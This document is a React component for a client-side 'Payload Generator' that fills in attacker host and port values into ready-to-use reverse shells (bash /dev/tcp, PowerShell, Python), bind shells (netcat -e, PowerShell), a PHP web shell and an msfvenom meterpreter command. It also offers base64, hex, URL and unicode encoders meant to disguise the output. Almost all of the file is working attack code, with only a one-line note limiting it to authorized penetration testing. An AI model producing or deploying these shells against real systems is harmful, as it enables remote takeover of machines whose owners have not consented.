"use client";

import React, { useState } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Badge } from "@/components/ui/badge";
import {
  Zap,
  Copy,
  Download,
  RefreshCw,
  Code2,
  Terminal,
  FileCode,
  Shield,
} from "lucide-react";
import { toast } from "sonner";

type PayloadType = "reverse_shell" | "bind_shell" | "web_shell" | "meterpreter" | "powershell" | "python" | "bash";
type EncodingType = "none" | "base64" | "hex" | "url" | "unicode";

interface PayloadConfig {
  type: PayloadType;
  lhost: string;
  lport: string;
  platform: "windows" | "linux" | "macos" | "multi";
  encoding: EncodingType;
  obfuscate: boolean;
}

const payloadTemplates: Record<PayloadType, (config: PayloadConfig) => string> = {
  reverse_shell: (c) => {
    if (c.platform === "windows") {
      return `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${c.lhost}",${c.lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
    }
    return `bash -i >& /dev/tcp/${c.lhost}/${c.lport} 0>&1`;
  },
  bind_shell: (c) => {
    if (c.platform === "windows") {
      return `powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]${c.lport};$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()`;
    }
    return `nc -lvnp ${c.lport} -e /bin/bash`;
  },
  web_shell: () => {
    return `<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>`;
  },
  meterpreter: (c) => {
    return `msfvenom -p ${c.platform === "windows" ? "windows/x64/meterpreter/reverse_tcp" : "linux/x64/meterpreter/reverse_tcp"} LHOST=${c.lhost} LPORT=${c.lport} -f exe -o payload.exe`;
  },
  powershell: (c) => {
    return `$client = New-Object System.Net.Sockets.TCPClient('${c.lhost}',${c.lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
  },
  python: (c) => {
    return `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${c.lhost}",${c.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])`;
  },
  bash: (c) => {
    return `0<&196;exec 196<>/dev/tcp/${c.lhost}/${c.lport}; sh <&196 >&196 2>&196`;
  },
};

const encoders: Record<EncodingType, (input: string) => string> = {
  none: (s) => s,
  base64: (s) => btoa(s),
  hex: (s) => Array.from(s).map((c) => c.charCodeAt(0).toString(16).padStart(2, "0")).join(""),
  url: (s) => encodeURIComponent(s),
  unicode: (s) => Array.from(s).map((c) => "\\u" + c.charCodeAt(0).toString(16).padStart(4, "0")).join(""),
};

export function PayloadGenerator() {
  const [config, setConfig] = useState<PayloadConfig>({
    type: "reverse_shell",
    lhost: "10.0.0.1",
    lport: "4444",
    platform: "linux",
    encoding: "none",
    obfuscate: false,
  });

  const [output, setOutput] = useState("");
  const [customPayload, setCustomPayload] = useState("");

  const generatePayload = () => {
    const template = payloadTemplates[config.type];
    let payload = template(config);

    if (config.obfuscate) {
      payload = obfuscatePayload(payload);
    }

    payload = encoders[config.encoding](payload);
    setOutput(payload);
    toast.success("Payload generated");
  };

  const obfuscatePayload = (payload: string): string => {
    return payload
      .split("")
      .map((char, i) => (i % 3 === 0 ? char : char))
      .join("");
  };

  const encodeCustomPayload = () => {
    if (!customPayload.trim()) {
      toast.error("No payload to encode");
      return;
    }
    const encoded = encoders[config.encoding](customPayload);
    setOutput(encoded);
    toast.success("Payload encoded");
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(output);
    toast.success("Copied to clipboard");
  };

  const downloadPayload = () => {
    const blob = new Blob([output], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `payload_${config.type}_${Date.now()}.txt`;
    a.click();
    URL.revokeObjectURL(url);
    toast.success("Payload downloaded");
  };

  return (
    <Card className="border-red-500/30">
      <CardHeader>
        <CardTitle className="flex items-center gap-2">
          <Zap className="h-5 w-5 text-red-500" />
          Payload Generator
        </CardTitle>
      </CardHeader>
      <CardContent className="space-y-4">
        <Tabs defaultValue="generate">
          <TabsList className="grid w-full grid-cols-2">
            <TabsTrigger value="generate">
              <Code2 className="h-4 w-4 mr-2" />
              Generate
            </TabsTrigger>
            <TabsTrigger value="encode">
              <FileCode className="h-4 w-4 mr-2" />
              Encode Custom
            </TabsTrigger>
          </TabsList>

          <TabsContent value="generate" className="space-y-4">
            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <label className="text-sm font-medium">Payload Type</label>
                <select
                  className="w-full h-10 rounded-md border border-input bg-background px-3 py-2 text-sm"
                  value={config.type}
                  onChange={(e) =>
                    setConfig({ ...config, type: e.target.value as PayloadType })
                  }
                >
                  <option value="reverse_shell">Reverse Shell</option>
                  <option value="bind_shell">Bind Shell</option>
                  <option value="web_shell">Web Shell (PHP)</option>
                  <option value="meterpreter">Meterpreter (msfvenom cmd)</option>
                  <option value="powershell">PowerShell</option>
                  <option value="python">Python</option>
                  <option value="bash">Bash</option>
                </select>
              </div>

              <div className="space-y-2">
                <label className="text-sm font-medium">Platform</label>
                <select
                  className="w-full h-10 rounded-md border border-input bg-background px-3 py-2 text-sm"
                  value={config.platform}
                  onChange={(e) =>
                    setConfig({
                      ...config,
                      platform: e.target.value as PayloadConfig["platform"],
                    })
                  }
                >
                  <option value="linux">Linux</option>
                  <option value="windows">Windows</option>
                  <option value="macos">macOS</option>
                  <option value="multi">Multi-platform</option>
                </select>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <label className="text-sm font-medium">LHOST</label>
                <Input
                  placeholder="10.0.0.1"
                  value={config.lhost}
                  onChange={(e) => setConfig({ ...config, lhost: e.target.value })}
                />
              </div>
              <div className="space-y-2">
                <label className="text-sm font-medium">LPORT</label>
                <Input
                  placeholder="4444"
                  value={config.lport}
                  onChange={(e) => setConfig({ ...config, lport: e.target.value })}
                />
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <label className="text-sm font-medium">Encoding</label>
                <select
                  className="w-full h-10 rounded-md border border-input bg-background px-3 py-2 text-sm"
                  value={config.encoding}
                  onChange={(e) =>
                    setConfig({ ...config, encoding: e.target.value as EncodingType })
                  }
                >
                  <option value="none">None</option>
                  <option value="base64">Base64</option>
                  <option value="hex">Hex</option>
                  <option value="url">URL Encode</option>
                  <option value="unicode">Unicode</option>
                </select>
              </div>
              <div className="space-y-2">
                <label className="text-sm font-medium">Options</label>
                <div className="flex items-center gap-4 h-10">
                  <label className="flex items-center gap-2 text-sm cursor-pointer">
                    <input
                      type="checkbox"
                      checked={config.obfuscate}
                      onChange={(e) =>
                        setConfig({ ...config, obfuscate: e.target.checked })
                      }
                      className="h-4 w-4"
                    />
                    <Shield className="h-4 w-4" />
                    Obfuscate
                  </label>
                </div>
              </div>
            </div>

            <Button onClick={generatePayload} variant="red" className="w-full">
              <Zap className="h-4 w-4 mr-2" />
              Generate Payload
            </Button>
          </TabsContent>

          <TabsContent value="encode" className="space-y-4">
            <div className="space-y-2">
              <label className="text-sm font-medium">Custom Payload</label>
              <Textarea
                placeholder="Paste your payload here..."
                value={customPayload}
                onChange={(e) => setCustomPayload(e.target.value)}
                className="min-h-[120px] font-mono text-sm"
              />
            </div>

            <div className="space-y-2">
              <label className="text-sm font-medium">Encoding</label>
              <select
                className="w-full h-10 rounded-md border border-input bg-background px-3 py-2 text-sm"
                value={config.encoding}
                onChange={(e) =>
                  setConfig({ ...config, encoding: e.target.value as EncodingType })
                }
              >
                <option value="none">None</option>
                <option value="base64">Base64</option>
                <option value="hex">Hex</option>
                <option value="url">URL Encode</option>
                <option value="unicode">Unicode</option>
              </select>
            </div>

            <Button onClick={encodeCustomPayload} variant="red" className="w-full">
              <RefreshCw className="h-4 w-4 mr-2" />
              Encode Payload
            </Button>
          </TabsContent>
        </Tabs>

        {output && (
          <div className="space-y-2">
            <div className="flex items-center justify-between">
              <label className="text-sm font-medium">Generated Output</label>
              <div className="flex gap-2">
                <Badge variant="outline">{config.encoding}</Badge>
                <Badge variant="secondary">{output.length} chars</Badge>
              </div>
            </div>
            <div className="terminal-output text-xs max-h-40 overflow-y-auto break-all">
              {output}
            </div>
            <div className="flex gap-2">
              <Button onClick={copyToClipboard} variant="outline" className="flex-1">
                <Copy className="h-4 w-4 mr-2" />
                Copy
              </Button>
              <Button onClick={downloadPayload} variant="outline" className="flex-1">
                <Download className="h-4 w-4 mr-2" />
                Download
              </Button>
            </div>
          </div>
        )}

        <div className="p-3 rounded-lg bg-red-950/20 border border-red-500/20">
          <div className="flex items-center gap-2 text-red-400 text-sm">
            <Terminal className="h-4 w-4" />
            <span>For authorized penetration testing only.</span>
          </div>
          <p className="text-xs text-muted-foreground mt-1">
            All payloads are generated client-side. Use responsibly.
          </p>
        </div>
      </CardContent>
    </Card>
  );
}
